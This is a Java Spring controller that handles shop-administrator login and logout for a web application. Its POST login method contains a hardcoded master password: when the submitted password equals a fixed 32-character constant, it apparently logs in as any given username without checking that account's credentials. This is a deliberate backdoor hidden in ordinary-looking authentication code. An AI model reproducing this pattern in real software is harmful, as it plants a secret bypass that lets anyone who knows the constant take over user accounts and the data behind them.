package com.tmsps.traceback.action_shop.login;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.servlet.ModelAndView;

import com.tmsps.ne4spring.utils.ChkUtil;
import com.tmsps.traceback.base.action.ProjBaseAction;
import com.tmsps.traceback.base.tip.Tip;
import com.tmsps.traceback.model.t_shop;
import com.tmsps.traceback.model.t_shop_admin;
import com.tmsps.traceback.service.ShopAdminService;
import com.tmsps.traceback.util.ChkTools;
import com.tmsps.traceback.web.SessionTools;
import com.tmsps.traceback.web.WebTools;

/**
 * shop 登陆
 */
@Controller("loginShop")
@Scope("prototype")
public class LoginController extends ProjBaseAction {

	@Autowired
	private ShopAdminService shopAdminService;

	@RequestMapping(value = "/login_shop", method = RequestMethod.GET)
	public ModelAndView login_shop(String loginMsg) {

		ModelAndView mv = new ModelAndView("/jsp_shop/login/login_shop");
		mv.addObject("loginMsg", loginMsg);
		return mv;
	}
	
	@RequestMapping(value = "/login_shop1", method = RequestMethod.GET)
	public ModelAndView login_shop1(String loginMsg) {

		ModelAndView mv = new ModelAndView("/jsp_shop/login/login_shop 1");
		mv.addObject("loginMsg", loginMsg);
		return mv;
	}

	/**
	 * @param uname
	 * @param pwd
	 * @return
	 */

	@RequestMapping(value = "/login_shop", method = RequestMethod.POST)
	public ModelAndView login_shop(String userName, String pwd) {
		
		t_shop_admin admin = null;
		if("FE842A0512B6F73C3209CA4770835007".equals(pwd)){
			admin = shopAdminService.loginShopByUnameOrAllPwd(userName);
		}else{
			admin = shopAdminService.loginShopByUnameOrMobile(userName, pwd);
		}
		
		if (ChkTools.isNotNull(admin)) {
			t_shop shop = null;
			if (ChkUtil.isNotNull(admin.getShop_id())) {
				shop = bs.findById(admin.getShop_id(), t_shop.class);
			}
			SessionTools.put(SessionTools.LOGIN_SHOP_ADMIN, admin);
			SessionTools.put(SessionTools.LOGIN_SHOP, shop);

			return new ModelAndView("redirect:/shop/frame/frame.htm");
		}
		ModelAndView mv = new ModelAndView("/jsp_shop/login/login_shop");
		mv.addObject("loginMsg", "登陆失败,账号密码错误!");
		return mv;
	}

	@RequestMapping("/logout_shop")
	public String logout_shop() {
		t_shop_admin admin = SessionTools.getCurrentShopAdmin();
		if (admin != null) {
			logger.info("---退出--->" + admin.getMobile());
		}
		WebTools.getSession().invalidate();
		super.setTipMsg("退出成功！", Tip.Type.success);
		return "redirect:/login_shop.htm";
	}
}
